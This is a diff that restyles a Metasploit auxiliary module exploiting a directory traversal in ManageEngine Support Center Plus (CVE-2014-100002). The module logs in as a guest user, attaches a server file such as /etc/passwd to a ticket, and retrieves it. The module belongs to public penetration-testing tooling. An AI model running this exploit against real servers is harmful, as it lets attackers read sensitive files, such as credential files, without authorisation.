@@ -8,29 +8,36 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "ManageEngine Support Center Plus Directory Traversal",
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in ManageEngine
-        Support Center Plus build 7916 and lower. The module will create a support ticket
-        as a normal user, attaching a link to a file on the server. By requesting our
-        own attachment, it's possible to retrieve any file on the filesystem with the same
-        privileges as Support Center Plus is running. On Windows this is always with SYSTEM
-        privileges.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
-      'References'     =>
-        [
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "ManageEngine Support Center Plus Directory Traversal",
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in ManageEngine
+          Support Center Plus build 7916 and lower. The module will create a support ticket
+          as a normal user, attaching a link to a file on the server. By requesting our
+          own attachment, it's possible to retrieve any file on the filesystem with the same
+          privileges as Support Center Plus is running. On Windows this is always with SYSTEM
+          privileges.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module
+        'References' => [
           ['CVE', '2014-100002'],
           ['EDB', '31262'],
           ['OSVDB', '102656'],
           ['BID', '65199'],
           ['PACKETSTORM', '124975']
         ],
-      'DisclosureDate' => '2014-01-28'
-    ))
+        'DisclosureDate' => '2014-01-28',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -39,7 +46,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),
         OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),
         OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -49,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Retrieving cookie")
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(uri, "")
+      'uri' => normalize_uri(uri, "")
     })
 
     if res and res.code == 200
@@ -61,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Logging in as user [ #{datastore['USER']} ]")
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri(uri, "j_security_check"),
+      'uri' => normalize_uri(uri, "j_security_check"),
       'cookie' => session,
       'vars_post' =>
       {
@@ -84,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment")
     res = send_request_cgi({
       'method' => 'POST',
-      'uri'    => normalize_uri(uri, "WorkOrder.do"),
+      'uri' => normalize_uri(uri, "WorkOrder.do"),
       'cookie' => session,
       'vars_post' =>
         {
@@ -109,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
           'autoCCList' => '',
           'addWO' => 'addWO'
         }
-      })
+    })
 
     if res and res.code == 200
       vprint_status("Ticket created")
@@ -155,4 +163,3 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 end
-
